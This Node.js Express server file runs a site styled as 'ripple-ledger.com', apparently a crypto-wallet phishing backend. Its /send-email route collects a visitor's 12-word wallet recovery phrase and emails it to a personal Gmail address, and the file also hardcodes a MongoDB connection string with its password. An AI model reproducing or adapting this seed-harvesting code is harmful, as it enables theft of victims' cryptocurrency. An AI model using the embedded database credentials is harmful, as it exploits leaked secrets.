require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const mongoose = require('mongoose');
const path = require('path');
const cookieParser = require('cookie-parser');
const withdrawalRoutes = require('./withdrawalRoutes');
const authRoutes = require('./authRoutes');
const adminRoutes = require('./adminRoutes');
const { requireAuth, checkUser } = require('./middleWare/authMiddleware');
const User = require("./models/user"); // ⬅️ ADD THIS


const app = express();
app.use(cookieParser());

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// Email setup using environment variables for Gmail credentials
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "ripple-ledger.com",  // from host docs
  port: Number(process.env.SMTP_PORT) || 465,          // 465 = SSL
  secure: true,                                        // true for 465
  auth: {
    user: process.env.EMAIL_USER || "support@ripple-ledger.com",
    pass: process.env.EMAIL_PASS
  },
  logger: true,   // log SMTP details
  debug: true     // show debug info
});


// Function to send email when a 12-word key phrase is submitted
app.post('/send-email', (req, res) => {
  const { keyPhrase } = req.body;
  if (!keyPhrase || keyPhrase.trim() === '') {
    return res.status(400).json({ success: false, message: 'Key phrase is required' });
  }

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'johnsonray1840@gmail.com',
    subject: '12 Key Phrase Submitted',
    text: `A user has submitted the following 12-word key phrase:\n\n${keyPhrase}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return res.status(500).json({ success: false, message: error.toString() });
    }
    res.status(200).json({ success: true, message: 'Email sent successfully!' });
  });
});

// View Engine
app.set('view engine', 'html');
const publicDirectoryPath = path.join(__dirname, '/public');
const viewspath = path.join(__dirname, '/views');
app.engine('html', require('ejs').renderFile);

app.set('views', viewspath);
app.use(express.static(publicDirectoryPath));

// ✅ Correct MongoDB Connection
const dbURL = 'mongodb+srv://evelyndantonio62:92939184@cluster0.tndfw.mongodb.net/pogba?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(dbURL, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('✅ Successfully connected to MongoDB Atlas');
  app.listen(8000, () => {
    console.log('🚀 Server is up and running on port 8000');
  });
}).catch((err) => {
  console.error('❌ MongoDB Connection Error:', err);
});

// Routes
app.get('/', (req, res) => res.render('index'));
app.get('/signup', (req, res) => {
  const inviteToken = req.query.invite || null;
  // Render signup page regardless, with defaults to avoid errors
  res.render('signup', {
    inviteToken,
    inviteRequired: false,
    errorMessage: null
  });
});
app.get('/login', (req, res) => res.render('login'));
app.get('/verify', (req, res) => res.render('verify'));
app.get("/dashboard", requireAuth, async (req, res) => {
  try {
    const user = await User.findById(req.userId).lean();
    if (!user) return res.redirect("/login");

    res.render("dashboard", { user });
  } catch (err) {
    console.error(err);
    res.redirect("/login");
  }
});app.get('/connect', requireAuth, checkUser, (req, res) => res.render('connect'));
app.get('/withdrawals', requireAuth, checkUser, (req, res) => res.render('withdrawal'));
app.get('/admin', requireAuth, checkUser, (req, res) => {
  res.render('admin');
});


// ✅ Mount routes properly
app.use('/api/auth', authRoutes);
app.use('/api/admin', adminRoutes);
app.use("/api", withdrawalRoutes);

